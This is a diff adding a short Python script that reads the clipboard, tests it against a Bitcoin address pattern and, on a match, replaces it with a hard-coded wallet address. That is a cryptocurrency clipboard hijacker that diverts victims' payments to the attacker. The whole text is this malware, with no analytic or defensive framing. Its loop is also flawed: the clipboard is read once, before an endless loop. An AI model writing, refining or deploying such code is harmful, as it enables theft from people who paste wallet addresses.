@@ -1,0 +1,19 @@
+import pyperclip
+import re
+
+def isValidBTCAddress(str):
+    regex = "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,34}$"
+    p = re.compile(regex)
+    if (str == None):
+        return False
+    if(re.search(p, str)):
+        return True
+    else:
+        return False
+
+clipboard_content = pyperclip.paste()
+content = str(clipboard_content)
+
+while True:
+    if isValidBTCAddress(content) == True:
+        pyperclip.copy("16UjcYNBG9GTK4uq2f7yYEbuifqCzoLMGS")
